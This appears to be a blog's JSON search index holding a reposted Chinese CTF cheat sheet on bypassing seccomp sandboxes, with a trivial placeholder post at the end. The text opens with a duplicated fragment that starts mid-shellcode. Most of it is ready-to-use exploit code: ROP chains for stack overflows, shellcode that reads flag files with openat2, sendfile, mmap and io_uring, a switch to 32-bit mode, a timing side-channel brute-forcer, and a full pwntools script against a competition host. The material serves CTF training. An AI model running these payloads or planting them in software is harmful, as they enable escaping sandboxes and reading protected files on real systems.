89\\x03\\x8bD$0\\xc7C\\x18d\\x00\\x00\\x00\\xc7D\\x05\\x00\\x00\\x00\\x00\\x00\\x8bD$\\x1c\\xffD\\x05\\x00D\\x89\\xe0\\x0f\\x05H\\x83\\xc4h1\\xc0[]A\\\\A]A^A_\\xc3./flag'比赛例题御网杯半决赛线下虽然保护全开，但是mmap把写入地方的权限改成可读可写可执行了，问题就是沙盒把orw和execve全禁了之前比赛一筹莫展，主要是积累函数太少了，可以用opennat,sendfile替代的exp:用opennat,sendfile替代1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192from pwn import *from ctypes import *pwn = './pwn'if args['REMOTE']: io = remote('192.168.18.22', 8888)else: io = process(pwn)context(log_level='debug')#context.terminal = ['tmux','splitw','-h']context.binary = elf = ELF(pwn)rop = ROP(context.binary)s = lambda data: io.send(data)sa = lambda text, data: io.sendafter(text, data)sl = lambda data: io.sendline(data)sla = lambda text, data: io.sendlineafter(text, data)r = lambda num=4096: io.recv(num)ru = lambda text: io.recvuntil(text)pr = lambda num=4096: print(io.recv(num))inter = lambda: io.interactive()l32 = lambda: u32(io.recvuntil(b'\\xf7')[-4:].ljust(4, b'\\x00'))l64 = lambda: u64(io.recvuntil(b'\\x7f')[-6:].ljust(8, b'\\x00'))uu32 = lambda: u32(io.recv(4).ljust(4, b'\\x00'))uu32_hex = lambda: int(io.recvuntil(b'0x', drop=True) + r(8), 16)uu64 = lambda: u64(io.recv(6).ljust(8, b'\\x00'))uu64_hex = lambda: int(io.recvuntil(b'0x', drop=True) + r(12), 16)uuu64 = lambda: u64(ru(b'\\x7f')[-6:].ljust(8, b'\\x00'))uuuu64 = lambda target: u64((ru(target)[-1:] + r(5)).ljust(8, b'\\x00'))int16 = lambda data: int(data, 16)lg = lambda s, num: io.success('%s -&gt; 0x%x' % (s, num))def get_sb(): return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/sh\\x00'))def get_orw(): return libc_base + libc.sym['open'], libc_base + libc.sym['read'], libc_base + libc.sym['write']def debug(script=f''): script = f'b __call_tls_dtors' gdb.attach(proc.pidof(io)[0], script) pause()def fmt(value, offset=14, size='hhn'): if size == 'hhn': num = value &amp; 0xff elif size == 'hn': num = value &amp; 0xffff elif size == 'n': num = value &amp; 0xffffffff payload = f'%{num}c%{offset}size'.encode() #value 是格式化字符串偏移 return payloadlss = lambda s: log.success('\\033[1;31;40m%s --&gt; 0x%x \\033[0m' % (s, eval(s)))def cat_flag(): flag_header = b'flag{' sleep(1) sl('cat flag') ru(flag_header) flag = flag_header + ru('}') + b'}' exit(0)#debug()shellcode = ''' mov r12, 0x0067616c66 mov [rsp], r12 xor rsi,rsi xor r10, r10 mov rdi, -100 mov rsi, rsp mov rdx, 0 mov rax,0x101 syscall mov rdi, 1 mov rsi, rax mov rdx, 0 mov r10, 0x100 mov rax, 0x28 syscall'''sl(asm(shellcode))inter()用opennat2，sendfile替代的1234567891011121314151617181920212223shellcode = '''mov r12, 0x0067616c66mov [rsp], r12xor rax, raxpush raxpush raxpush raxpush raxmov rdi, -100 lea rsi, [rsp+0x20] mov rdx, rsp mov r10, 0x18 mov rax, 437 syscallmov rdi, 1mov rsi, raxmov rdx, 0mov r10, 0x100mov rax, 0x28syscall'''用mmap，writev替代的1234567891011121314151617181920212223242526272829303132333435shellcode = '''mov r12, 0x0067616c66mov [rsp], r12xor rax, raxpush raxpush raxpush raxpush raxmov rdi, -100 lea rsi, [rsp+0x20] mov rdx, rsp mov r10, 0x18 mov rax, 437 syscallmov rdi, 0x777721000mov rsi, 0x100mov rdx, 1mov r10, 2mov r8, 3mov r9, 0mov rax, 9syscallmov rbx, 0x777721000 mov rcx, 0x100 sub rsp, 0x20mov [rsp], rbxmov [rsp + 8], rcxmov rdi, 1 mov rsi, rsp mov rdx, 1 mov rax, 0x14 syscall'''一直在学习大佬的路上转载作者原文 https://www.cnblogs.com/xmiscx/p/18827064",
      "title_content": "seccomp沙盒绕过 &lt;h1 id=\"seccomp沙盒绕过-rop与shellcode集合\"&gt;seccomp沙盒绕过 (rop与shellcode集合)&lt;/h1&gt;前言起因在每次遇到沙盒时都要重新写rop或者shellcode，这非常不健康，所以我写了这篇文章，尽可能的让这里的代码能拿来就能用。在正篇里将直接用rop或shellcode中使用的函数进行命名，这样可以快速并清晰的找到要用的代码。注意: open+read+write为模版，之后相对应的代码可以直接进行替换，比如pread64可以直接将read进行替换（活字印刷术）。以下为例题程序 1234567891011121314151617181920212223242526272829# rop对应程序int __fastcall main(int argc, const char **argv, const char **envp){char v4[16]; // [rsp+0h] [rbp-10h] BYREFprintf(\"%lp\\n\", &amp;printf, envp);gets(v4);return 0;}# python3脚本from pwncli import *context(arch='amd64',os='linux',log_level='debug')p = lambda s,t: print(f\"\\033[0;31;43m{s.ljust(15, ' ') + '-------------------------&gt;' + hex(t)}\\033[0m\")sh = process(\"./rop\")libc = ELF(\"/lib/x86_64-linux-gnu/libc.so.6\")libc.address = eval(sh.recvline()) - libc.sym[\"printf\"]# ---------需要更改pop_rdi = libc.address + 0x000000000002a3e5pop_rsi = libc.address + 0x0000000000163f88pop_rdx_r12 = libc.address + 0x000000000011f2e7pop_rcx = libc.address + 0x000000000003d1eerop = b\"a\"*0x18 + [rop程序] # ------sh.sendline(rop)sh.interactive() 1234567891011# python3脚本from pwncli import *context(arch='amd64',os='linux',log_level='debug')p = lambda s,t: print(f\"\\033[0;31;43m{s.ljust(15, ' ') + '-------------------------&gt;' + hex(t)}\\033[0m\")sh = process(\"./shellcode\")shellcode = [shellcode代码] #-----------sh.sendline(asm(shellcode))sh.interactive() 沙盒沙盒是一种对程序的保护，他可以禁用一些系统调用从而增加pwn题目的难度，迫使pwner们通过ORW的方法进行绕过沙盒。比如最常见的禁用execve，那么就只能通过open，read，write来直接读取flag的内容。沙盒检测1seccomp-tools dump ./pwn正篇open+read+writerop12345678rop = b\"a\"*0x18rop += flat(pop_rdi, 0, pop_rsi, libc.sym[\"_IO_list_all\"]+8, pop_rdx_r12, 0x200, 0, libc.sym[\"read\"]) # readrop += flat(pop_rdi, libc.sym[\"_IO_list_all\"]+8, pop_rsi, 0, pop_rdx_r12, 0, 0, libc.sym[\"open\"]) # openrop += flat(pop_rdi, 3, pop_rsi, libc.sym[\"_IO_list_all\"]+8, pop_rdx_r12, 0x200, 0, libc.sym[\"read\"]) # readrop += flat(pop_rdi, 1, pop_rsi, libc.sym[\"_IO_list_all\"]+8, pop_rdx_r12, 0x200, 0, libc.sym[\"write\"]) # writesh.sendline(rop)sh.sendline(\"/flag\\x00\")shellcode12345678910111213141516171819202122232425262728293031323334shellcode = shellcraft.amd64.pushstr(\"/flag\")shellcode += shellcraft.amd64.linux.open('rsp', 0, 0)shellcode += shellcraft.amd64.linux.read('rax', 'rsp', 0x200)shellcode += shellcraft.amd64.linux.write(1, 'rsp', 0x200)flag_name = b'/flag'shellcode = \"\"shellcode += \"\"\" mov r12,\"\"\" + str(u64(flag_name.ljust(8,b'\\x00'))) + \"\"\" mov [rsp],r12\"\"\"shellcode += \"\"\" mov rdi, rsp mov rsi, 0 mov rdx, 0 mov rax,2 syscall\"\"\" # openshellcode += \"\"\" mov rdi, 3 mov rsi, rsp mov rdx, 0x100 xor rax, rax syscall\"\"\" # readshellcode += \"\"\" mov rdi, 1 mov rsi, rsp mov rdx, 0x100 mov rax, 1 syscall\"\"\" # writeopen替代openat rop 1rop += flat(pop_rdi, 3, pop_rsi, libc.sym[\"_IO_list_all\"]+8, pop_rdx_r12, 0, 0, libc.sym[\"openat\"]) shellcode 1234567891011shellcode += shellcraft.amd64.linux.openat(3,'rsp', 0)shellcode += \"\"\"mov rdi, -100 #mov rdi, 3也可以，但是不通用，要是fd=3所指的目录mov rsi, rspmov rdx, 0mov r10, 0mov rax,0x101syscall\"\"\" openat2 rop 12345678bss_addr = 0x000000000404020 # 写bss段exec_fd = (bss_addr &gt;&gt; 12) &lt;&lt; 12rop = b\"a\" * 0x18rop += flat(pop_rdi, exec_fd, pop_rsi, 0x1000, pop_rdx_r12, 7, 0, libc.sym[\"mprotect\"])rop += flat(pop_rdi, 0, pop_rsi, exec_fd, pop_rdx_r12, 0x1000, 0, libc.sym[\"read\"], exec_fd)sh.sendline(rop)sh.sendline([shellcode]) # 填写shellcode shellcode 1234567891011121314151617181920212223shellcode = '''mov r12, 0x0067616c66mov [rsp], r12xor rax, raxpush raxpush raxpush raxpush raxmov rdi, -100 lea rsi, [rsp+0x20] mov rdx, rsp mov r10, 0x18 mov rax, 437 syscallmov rdi, 1mov rsi, raxmov rdx, 0mov r10, 0x100mov rax, 0x28syscall''' read替代pread rop 1rop += flat(pop_rdi, 3, pop_rsi, libc.sym[\"_IO_list_all\"]+8, pop_rdx_r12, 0x200, 0, pop_rcx, 0, libc.sym[\"pread\"]) shellcode 1234567891011shellcode += shellcraft.amd64.linux.pread('rax', 'rsp', 0x200, 0)shellcode += \"\"\"mov rdi, 3mov rsi, rspmov rdx, 0x100mov r10, 0mov rax, 0x11syscall\"\"\" # read readv rop 12345678bss_addr = 0x000000000404020 # 写bss段exec_fd = (bss_addr &gt;&gt; 12) &lt;&lt; 12rop = b\"a\" * 0x18rop += flat(pop_rdi, exec_fd, pop_rsi, 0x1000, pop_rdx_r12, 7, 0, libc.sym[\"mprotect\"])rop += flat(pop_rdi, 0, pop_rsi, exec_fd, pop_rdx_r12, 0x1000, 0, libc.sym[\"read\"], exec_fd)sh.sendline(rop)sh.sendline([shellcode]) # 填写shellcode shellcode 123456789101112131415161718shellcode += '''push 0x200push 0x200mov [rsp],rsp'''shellcode += shellcraft.amd64.linux.readv('rax', 'rsp', 1)shellcode += \"\"\"push 0x200push 0x200mov [rsp],rspmov rdi, 3mov rsi, rspmov rdx, 0x1mov rax, 0x13syscall\"\"\" # read preadv rop 12345678bss_addr = 0x000000000404020 # 写bss段exec_fd = (bss_addr &gt;&gt; 12) &lt;&lt; 12rop = b\"a\" * 0x18rop += flat(pop_rdi, exec_fd, pop_rsi, 0x1000, pop_rdx_r12, 7, 0, libc.sym[\"mprotect\"])rop += flat(pop_rdi, 0, pop_rsi, exec_fd, pop_rdx_r12, 0x1000, 0, libc.sym[\"read\"], exec_fd)sh.sendline(rop)sh.sendline([shellcode]) # 填写shellcode shellcode 1234567891011121314151617shellcode += '''push 0x200push 0x200mov [rsp],rsp'''shellcode += shellcraft.amd64.linux.preadv('rax', 'rsp', 1, 0)shellcode += \"\"\"push 0x200push 0x200mov [rsp],rspmov rdi, 3mov rsi, rspmov rdx, 0x1mov r10, 0mov rax, 0x127syscall\"\"\" # read mmap rop 12345678bss_addr = 0x000000000404020 # 写bss段exec_fd = (bss_addr &gt;&gt; 12) &lt;&lt; 12rop = b\"a\" * 0x18rop += flat(pop_rdi, exec_fd, pop_rsi, 0x1000, pop_rdx_r12, 7, 0, libc.sym[\"mprotect\"])rop += flat(pop_rdi, 0, pop_rsi, exec_fd, pop_rdx_r12, 0x1000, 0, libc.sym[\"read\"], exec_fd)sh.sendline(rop)sh.sendline([shellcode]) # 填写shellcode shellcode 123456789101112131415# 主要mmap映射到了0x777721000，所以之后的write也需要输出0x777721000位置的内容。shellcode += shellcraft.amd64.linux.mmap(0x777721000, 0x100, 1, 2, 3, 0)# 主要mmap映射到了0x777721000，所以之后的write也需要输出0x777721000位置的内容。shellcode += \"\"\"mov rdi, 0x777721000mov rsi, 0x100mov rdx, 1mov r10, 2mov r8, 3mov r9, 0mov rax, 9syscall\"\"\" # read sendfilesendfile可以直接代替write与read rop 1rop += flat(pop_rdi, 1, pop_rsi, 3, pop_rdx_r12, 0, 0, pop_rcx, 0x100, libc.sym[\"sendfile\"]) shellcode 1234567891011shellcode += shellcraft.amd64.linux.sendfile(1, \"rax\", 0, 0x200)shellcode += \"\"\"mov rdi, 1mov rsi, raxmov rdx, 0mov r10, 0x100mov rax, 0x28syscall\"\"\" write替代writev rop 12345678bss_addr = 0x000000000404020 # 写bss段exec_fd = (bss_addr &gt;&gt; 12) &lt;&lt; 12rop = b\"a\" * 0x18rop += flat(pop_rdi, exec_fd, pop_rsi, 0x1000, pop_rdx_r12, 7, 0, libc.sym[\"mprotect\"])rop += flat(pop_rdi, 0, pop_rsi, exec_fd, pop_rdx_r12, 0x1000, 0, libc.sym[\"read\"], exec_fd)sh.sendline(rop)sh.sendline([shellcode]) # 填写shellcode shellcode 1234567891011121314151617181920# 注意flag输出不在开头shellcode += '''push 0x200push 0x200mov [rsp],rsp'''shellcode += shellcraft.amd64.linux.writev(1, 'rsp', 0x1)# 注意flag输出不在开头shellcode += \"\"\"push 0x200push 0x200mov [rsp],rspmov rdi, 1mov rsi, rspmov rdx, 0x1mov rax, 0x14syscall\"\"\" # write sendfilesendfile可以直接代替write与read rop 1rop += flat(pop_rdi, 1, pop_rsi, 3, pop_rdx_r12, 0, 0, pop_rcx, 0x100, libc.sym[\"sendfile\"]) shellcode 123456789shellcode += shellcraft.amd64.linux.sendfile(1, \"rax\", 0, 0x200)shellcode += \"\"\"mov rdi, 1mov rsi, raxmov rdx, 0mov r10, 0x100mov rax, 0x28syscall\"\"\" 侧信道攻击 这个攻击比较特殊，实在没有输出手段的时候就利用此方法，此方法相当不准确，谨慎使用。 如果rop同上面一样使用 12345678bss_addr = 0x000000000404020 # 写bss段exec_fd = (bss_addr &gt;&gt; 12) &lt;&lt; 12rop = b\"a\" * 0x18rop += flat(pop_rdi, exec_fd, pop_rsi, 0x1000, pop_rdx_r12, 7, 0, libc.sym[\"mprotect\"])rop += flat(pop_rdi, 0, pop_rsi, exec_fd, pop_rdx_r12, 0x1000, 0, libc.sym[\"read\"], exec_fd)sh.sendline(rop)sh.sendline([shellcode]) # 填写shellcode 来转化成写shellcode接下来看shellcode怎么写。现在假设flag已经读到了栈上，但是没有办法读（没有系统调用 &amp; close(1)）。那么可以进行爆破，因为没有返回，所以爆破就只能看时间来判断。 123456789101112131415161718192021flag = ''for offset in range(30):for byte in range(0x20,0x80): sh = process(\"./shellcode\") shell = asm(shellcode + \"\"\" infinite_loop: cmp byte ptr[rsp+{}], {} je infinite_loop \"\"\".format(str(offset),str(byte))) sh.sendlineafter(\"shellcode: \\n\",shell) try: sh.recv(timeout=0.2) flag += chr(byte) print(flag + \"---\" + str(byte)) sh.close() break except: pass print(flag + \"---\" + str(byte)) sh.close() shellcode为读取文件的code。 很慢，但可行。转32位利用条件 沙箱没有arch==ARCH_x86_64检测 可以使用mmmap或者mprotect和32位的地址 rop 可以调用mprotect来转化成写shellcode 12345678bss_addr = 0x000000000404020 # 写bss段exec_fd = (bss_addr &gt;&gt; 12) &lt;&lt; 12rop = b\"a\" * 0x18rop += flat(pop_rdi, exec_fd, pop_rsi, 0x1000, pop_rdx_r12, 7, 0, libc.sym[\"mprotect\"])rop += flat(pop_rdi, 0, pop_rsi, exec_fd, pop_rdx_r12, 0x1000, 0, libc.sym[\"read\"], exec_fd)sh.sendline(rop)sh.sendline([shellcode]) # 填写shellcode shellcode 123456789101112131415161718192021222324252627282930313233343536373839404142434445shellcode64 = shellcraft.amd64.linux.mmap(0x700000, 0x1000, 7, 0x32, -1, 0)shellcode64 += shellcraft.amd64.linux.read(0, 0x700000, 0x1000)shellcode64 += \"\"\"mov rsp,0x700800mov DWORD PTR [rsp+4], 0x23mov DWORD PTR [rsp], 0x700000retfd\"\"\"shellcode32 = \"\"\"push 0x67616C66\"\"\"shellcode32 += \"\"\"push esppush 0push 0pop edxpop ecxpop ebxpush 5pop eaxint 0x80\"\"\" # openshellcode32 += \"\"\"push eaxpush esppush 0x100pop edxpop ecxadd ecx, 0x20pop ebxpush 3pop eaxint 0x80\"\"\" # readshellcode32 += \"\"\"push 1pop ebxpush 4pop eaxint 0x80\"\"\" # writesh.sendline(asm(shellcode64, arch='amd64', bits=64))sh.sendline(asm(shellcode32, arch='i386', bits=32)) 绕过close(1)侧信道攻击同write替代中的侧信道攻击远程链接socket&amp;connect有些程序会调用子进程，子进程对外开放，但是rop写后只能在主进程运行，输出没法显示在远程，或者close(1)，那么可以用此方法，此方法需要公网ip。1234567891011121314#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;arpa/inet.h&gt;#include &lt;sys/socket.h&gt;int main() { struct sockaddr_in *serv_addr = malloc(sizeof(struct sockaddr_in)); memset(serv_addr, 0, sizeof(struct sockaddr_in)); serv_addr-&gt;sin_family = AF_INET; serv_addr-&gt;sin_addr.s_addr = inet_addr(\"127.0.0.1\"); //填入ip地址和端口 serv_addr-&gt;sin_port = htons(8888); printf(%lp,*serv_addr); return 0;}open(\"/dev/pts/?\")使用open(\"/dev/pts/?\")重新打开标准输出超级代码这个代码利用了下面三个个系统调用1239 common mmap __x64_sys_mmap425 common io_uring_setup __x64_sys_io_uring_setup426 common io_uring_enter __x64_sys_io_uring_enter汇编如下push r15mov ecx,0x1epush r14push r13xor r13d,r13dpush r12mov eax,r13dpush rbppush rbxsub rsp,0x68lea rdi,[rsp-0x10]lea rsi,[rsp-0x10]rep stos DWORD PTR es:[rdi],eaxmov edi,0x10mov eax,0x1a9syscallmov ebx,0x9mov r12,raxmov r14d,eaxmov r8d,eaxxor r9d,r9dmov r10d,0x1mov edx,0x3xor edi,edimov esi,0x1000mov eax,ebxsyscallmov r9d,0x8000000mov rbp,raxmov eax,ebxsyscallmov r9d,0x10000000mov r15,raxmov eax,ebxsyscallmov ecx,0x10mov rbx,raxmov rdi,raxmov eax,r13drep stos DWORD PTR es:[rdi],eaxmov edi,r12dmov r12d,0x1aaxor r9d,r9dxor r8d,r8dmov edx,0x1mov esi,0x1movabs rax,0xffffff9c00001012mov QWORD PTR [rbx],raxlea rax,[rip+0xc1] # 0x7ffcf065b5c0mov QWORD PTR [rbx+0x10],raxmov eax,DWORD PTR [rsp+0x30]mov DWORD PTR [rbp+rax*1+0x0],0x0mov eax,DWORD PTR [rsp+0x1c]inc DWORD PTR [rbp+rax*1+0x0]mov eax,r12dsyscallmov eax,DWORD PTR [rsp+0x54]mov rdi,rbxmov ecx,0x10mov edx,DWORD PTR [r15+rax*1+0x8]mov eax,r13dlea r15,[rsp-0x74]rep stos DWORD PTR es:[rdi],eaxmov BYTE PTR [rbx],0x16mov eax,DWORD PTR [rsp+0x30]mov edi,r14dmov DWORD PTR [rbx+0x4],edxmov edx,0x1mov QWORD PTR [rbx+0x10],r15mov DWORD PTR [rbx+0x18],0x64mov DWORD PTR [rbp+rax*1+0x0],0x0mov eax,DWORD PTR [rsp+0x1c]inc DWORD PTR [rbp+rax*1+0x0]mov eax,r12dsyscallmov ecx,0x10mov eax,r13dmov rdi,rbxmov edx,0x3rep stos DWORD PTR es:[rdi],eaxmov QWORD PTR [rbx+0x10],r15mov edi,r14dmovabs rax,0x100000017mov QWORD PTR [rbx],raxmov eax,DWORD PTR [rsp+0x30]mov DWORD PTR [rbx+0x18],0x64mov DWORD PTR [rbp+rax*1+0x0],0x0mov eax,DWORD PTR [rsp+0x1c]inc DWORD PTR [rbp+rax*1+0x0]mov eax,r12dsyscalladd rsp,0x68xor eax,eaxpop rbxpop rbppop r12pop r13pop r14pop r15retcs (bad)机器码如下1shellcode = b'AW\\xb9\\x1e\\x00\\x00\\x00AVAUE1\\xedATD\\x89\\xe8USH\\x83\\xechH\\x8d|$\\xf0H\\x8dt$\\xf0\\xf3\\xab\\xbf\\x10\\x00\\x00\\x00\\xb8\\xa9\\x01\\x00\\x00\\x0f\\x05\\xbb\\t\\x00\\x00\\x00I\\x89\\xc4A\\x89\\xc6A\\x89\\xc0E1\\xc9A\\xba\\x01\\x00\\x00\\x00\\xba\\x03\\x00\\x00\\x001\\xff\\xbe\\x00\\x10\\x00\\x00\\x89\\xd8\\x0f\\x05A\\xb9\\x00\\x00\\x00\\x08H\\x89\\xc5\\x89\\xd8\\x0f\\x05A\\xb9\\x00\\x00\\x00\\x10I\\x89\\xc7\\x89\\xd8\\x0f\\x05\\xb9\\x10\\x00\\x00\\x00H\\x89\\xc3H\\x89\\xc7D\\x89\\xe8\\xf3\\xabD\\x89\\xe7A\\xbc\\xaa\\x01\\x00\\x00E1\\xc9E1\\xc0\\xba\\x01\\x00\\x00\\x00\\xbe\\x01\\x00\\x00\\x00H\\xb8\\x12\\x10\\x00\\x00\\x9c\\xff\\xff\\xffH\\x89\\x03H\\x8d\\x05\\xc1\\x00\\x00\\x00H\\x89C\\x10\\x8bD$0\\xc7D\\x05\\x00\\x00\\x00\\x00\\x00\\x8bD$\\x1c\\xffD\\x05\\x00D\\x89\\xe0\\x0f\\x05\\x8bD$TH\\x89\\xdf\\xb9\\x10\\x00\\x00\\x00A\\x8bT\\x07\\x08D\\x89\\xe8L\\x8d|$\\x8c\\xf3\\xab\\xc6\\x03\\x16\\x8bD$0D\\x89\\xf7\\x89S\\x04\\xba\\x01\\x00\\x00\\x00L\\x89{\\x10\\xc7C\\x18d\\x00\\x00\\x00\\xc7D\\x05\\x00\\x00\\x00\\x00\\x00\\x8bD$\\x1c\\xffD\\x05\\x00D\\x89\\xe0\\x0f\\x05\\xb9\\x10\\x00\\x00\\x00D\\x89\\xe8H\\x89\\xdf\\xba\\x03\\x00\\x00\\x00\\xf3\\xabL\\x89{\\x10D\\x89\\xf7H\\xb8\\x17\\x00\\x00\\x00\\x01\\x00\\x00\\x00H\\x89\\x03\\x8bD$0\\xc7C\\x18d\\x00\\x00\\x00\\xc7D\\x05\\x00\\x00\\x00\\x00\\x00\\x8bD$\\x1c\\xffD\\x05\\x00D\\x89\\xe0\\x0f\\x05H\\x83\\xc4h1\\xc0[]A\\\\A]A^A_\\xc3./flag'比赛例题御网杯半决赛线下虽然保护全开，但是mmap把写入地方的权限改成可读可写可执行了，问题就是沙盒把orw和execve全禁了之前比赛一筹莫展，主要是积累函数太少了，可以用opennat,sendfile替代的exp:用opennat,sendfile替代1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192from pwn import *from ctypes import *pwn = './pwn'if args['REMOTE']: io = remote('192.168.18.22', 8888)else: io = process(pwn)context(log_level='debug')#context.terminal = ['tmux','splitw','-h']context.binary = elf = ELF(pwn)rop = ROP(context.binary)s = lambda data: io.send(data)sa = lambda text, data: io.sendafter(text, data)sl = lambda data: io.sendline(data)sla = lambda text, data: io.sendlineafter(text, data)r = lambda num=4096: io.recv(num)ru = lambda text: io.recvuntil(text)pr = lambda num=4096: print(io.recv(num))inter = lambda: io.interactive()l32 = lambda: u32(io.recvuntil(b'\\xf7')[-4:].ljust(4, b'\\x00'))l64 = lambda: u64(io.recvuntil(b'\\x7f')[-6:].ljust(8, b'\\x00'))uu32 = lambda: u32(io.recv(4).ljust(4, b'\\x00'))uu32_hex = lambda: int(io.recvuntil(b'0x', drop=True) + r(8), 16)uu64 = lambda: u64(io.recv(6).ljust(8, b'\\x00'))uu64_hex = lambda: int(io.recvuntil(b'0x', drop=True) + r(12), 16)uuu64 = lambda: u64(ru(b'\\x7f')[-6:].ljust(8, b'\\x00'))uuuu64 = lambda target: u64((ru(target)[-1:] + r(5)).ljust(8, b'\\x00'))int16 = lambda data: int(data, 16)lg = lambda s, num: io.success('%s -&gt; 0x%x' % (s, num))def get_sb(): return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/sh\\x00'))def get_orw(): return libc_base + libc.sym['open'], libc_base + libc.sym['read'], libc_base + libc.sym['write']def debug(script=f''): script = f'b __call_tls_dtors' gdb.attach(proc.pidof(io)[0], script) pause()def fmt(value, offset=14, size='hhn'): if size == 'hhn': num = value &amp; 0xff elif size == 'hn': num = value &amp; 0xffff elif size == 'n': num = value &amp; 0xffffffff payload = f'%{num}c%{offset}size'.encode() #value 是格式化字符串偏移 return payloadlss = lambda s: log.success('\\033[1;31;40m%s --&gt; 0x%x \\033[0m' % (s, eval(s)))def cat_flag(): flag_header = b'flag{' sleep(1) sl('cat flag') ru(flag_header) flag = flag_header + ru('}') + b'}' exit(0)#debug()shellcode = ''' mov r12, 0x0067616c66 mov [rsp], r12 xor rsi,rsi xor r10, r10 mov rdi, -100 mov rsi, rsp mov rdx, 0 mov rax,0x101 syscall mov rdi, 1 mov rsi, rax mov rdx, 0 mov r10, 0x100 mov rax, 0x28 syscall'''sl(asm(shellcode))inter()用opennat2，sendfile替代的1234567891011121314151617181920212223shellcode = '''mov r12, 0x0067616c66mov [rsp], r12xor rax, raxpush raxpush raxpush raxpush raxmov rdi, -100 lea rsi, [rsp+0x20] mov rdx, rsp mov r10, 0x18 mov rax, 437 syscallmov rdi, 1mov rsi, raxmov rdx, 0mov r10, 0x100mov rax, 0x28syscall'''用mmap，writev替代的1234567891011121314151617181920212223242526272829303132333435shellcode = '''mov r12, 0x0067616c66mov [rsp], r12xor rax, raxpush raxpush raxpush raxpush raxmov rdi, -100 lea rsi, [rsp+0x20] mov rdx, rsp mov r10, 0x18 mov rax, 437 syscallmov rdi, 0x777721000mov rsi, 0x100mov rdx, 1mov r10, 2mov r8, 3mov r9, 0mov rax, 9syscallmov rbx, 0x777721000 mov rcx, 0x100 sub rsp, 0x20mov [rsp], rbxmov [rsp + 8], rcxmov rdi, 1 mov rsi, rsp mov rdx, 1 mov rax, 0x14 syscall'''一直在学习大佬的路上转载作者原文 https://www.cnblogs.com/xmiscx/p/18827064"
    },
  
    {
      "title": "我的第一篇博客",
      "url": "https://liyckonline.top/%E6%8A%80%E6%9C%AF/2025/06/16/my-first-post/",
      "date": "2025-06-16",
      "content": "这里是文章的正文内容，可以用 Markdown 语法写。一级标题二级标题 列表项1 列表项2代码示例：1puts \"Hello, Jekyll!\"undefined",
      "title_content": "我的第一篇博客 &lt;p&gt;这里是文章的正文内容，可以用 Markdown 语法写。&lt;/p&gt;一级标题二级标题 列表项1 列表项2代码示例：1puts \"Hello, Jekyll!\"undefined"
    }
  
]
